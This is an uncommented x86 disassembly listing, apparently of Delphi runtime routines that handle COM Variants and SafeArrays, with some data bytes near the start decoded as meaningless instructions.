lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e191
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40 ] bl
add [ eax + eax ] cl
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
outsd
inc ebp
push esi
popad
jb r-xdata
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
pop ss
add [ eax ] al
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
jb r-xdata
ja r-xdata
fiadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
loope r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
pop ss
inc ebp
push esi
popad
jb r-xdata
push ebp
push sub_40e18a
push [ fs : eax ]
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_40e140
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e18a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e191
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40e194
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e223
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_412f54
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_412f54
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e22a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403ec0
retn
sub_40e230
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e27a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e281
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40e284
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e313
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_412f54
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_412f54
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e31a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403ec0
retn
sub_40e320
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e36a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e371
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40e374
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e5b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5c0
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403ec0
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403ec0
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
jmp r-xdata
dec eax
je r-xdata
call sub_40e140
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
jmp r-xdata
jmp r-xdata
call sub_40e230
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ac1c
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
jmp r-xdata
jmp r-xdata
sub_40e5d4
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e194
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e284
jmp r-xdata
jmp r-xdata
call sub_40e374
sub_40e608
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4027c4
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
call sub_4027c4
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40e5d4
pop esi
pop ebx
retn
call sub_4027c4
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40e5d4
jmp r-xdata
call sub_402804
mov edx eax
mov eax edx
call sub_4038d8
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40e5d4
jmp r-xdata
pop esi
pop ebx
retn
sub_40e68c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e6d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e6dd
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40e6f4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e724
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e724
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e780
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e5c8
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e5c8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e6f4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e5c8
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e5c8
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e724
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e5c8
mov eax [ ebp - 0x314 ]
call sub_40e978
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40e8fc
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e5c8
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403e9c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_4133b0
test al al
je r-xdata
mov eax ebx
call sub_40e780
jmp r-xdata
push ebx
call VariantClear
call sub_40e5c8
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40e994
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e9c4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e9c4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ea20
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e5c8
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e5c8
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40e978
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e320
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e5c8
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e5c8
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e994
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40e9c4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e5c8
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e5c8
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ebf4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40e8fc
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e5c8
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403ef0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_4133b0
test al al
je r-xdata
mov ecx sub_40ebec
mov edx esi
mov eax ebx
call sub_40ea20
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e5c8
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40eca0
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40ebf4
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40e8fc
sub_40ece4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ed40
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40eca0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40ef6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed47
lea eax [ ebp - 0x10 ]
call sub_40e978
retn
sub_40ed50
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ed8e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412390
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_412d40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed95
lea eax [ ebp - 0x4 ]
call sub_40457c
retn
sub_40ed9c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40edda
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_411c68
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_412d14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ede1
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40ede8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ee26
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412a34
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_412da4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee2d
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
sub_40ee34
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ee72
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412968
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_412d78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee79
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
sub_40ee80
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40ef6c
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40e5d4
jmp r-xdata
mov edx esi
call sub_40e194
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40e5d4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40ef00
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_4133b0
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40ece4
jmp r-xdata
mov edx esp
mov eax esi
call sub_4133b0
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40ee80
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40ef6c
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40eca0
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ef6c
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40efb1 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40ed9c
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40e6e0
jmp r-xdata
mov eax ebx
call sub_40f8d8
mov edx eax
mov eax esi
call sub_412bbc
jmp r-xdata
mov eax ebx
call sub_40f330
mov edx eax
mov eax esi
call sub_412b1c
jmp r-xdata
mov eax ebx
call sub_410c74
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_412c08
jmp r-xdata
mov eax ebx
call sub_4108f8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_412c2c
jmp r-xdata
mov eax ebx
call sub_4115b4
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_412c58
jmp r-xdata
mov eax ebx
call sub_41104c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_412c84
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40ed50
jmp r-xdata
mov eax ebx
call sub_4103f0
mov edx eax
mov eax esi
call sub_412cb0
jmp r-xdata
mov eax ebx
call sub_40f780
mov edx eax
mov eax esi
call sub_412b9c
jmp r-xdata
mov eax ebx
call sub_40f830
mov edx eax
mov eax esi
call sub_412b3c
jmp r-xdata
mov eax ebx
call sub_40f9d0
mov edx eax
mov eax esi
call sub_412b5c
jmp r-xdata
mov eax ebx
call sub_40faa8
mov edx eax
mov eax esi
call sub_412b7c
jmp r-xdata
mov eax ebx
call sub_40fdf4
push edx
push eax
mov eax esi
call sub_412bdc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40ede8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40ee34
jmp r-xdata
mov dx 0x101
call sub_40e194
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40e978
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40ef00
xor edx edx
mov ax 0x1
call sub_40e194
jmp r-xdata
sub_40f198
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f23b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412390
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404124
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_408030
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f242
lea eax [ ebp - 0xc ]
call sub_403e9c
lea eax [ ebp - 0x8 ]
call sub_40457c
retn
mov eax ebx
call sub_4103f0
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40e5d4
jmp r-xdata
sub_40f24c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40e5d4
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40f288
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f2dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40eca0
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40f330
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f2e3
lea eax [ ebp - 0x14 ]
call sub_40e978
retn
